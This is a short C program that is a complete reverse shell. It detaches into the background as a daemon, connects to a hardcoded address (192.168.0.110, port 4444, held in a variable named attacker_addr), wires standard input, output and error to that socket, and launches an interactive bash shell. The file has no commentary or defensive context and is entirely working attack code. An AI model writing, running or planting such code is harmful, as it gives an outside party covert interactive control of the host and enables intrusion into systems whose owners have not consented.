#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char **argv)
{
	daemon(1, 0);

	int sockfd = -1;
	struct sockaddr_in attacker_addr;

	attacker_addr.sin_family = AF_INET;
	attacker_addr.sin_port = htons(4444);
	attacker_addr.sin_addr.s_addr = inet_addr("192.168.0.110");

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0)
	{
		return -1;
	}

	if (connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) != 0)
	{
		return -1;
	}

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);
	execl("/bin/bash", "/bin/bash", "-i", NULL);

	return 0;
}
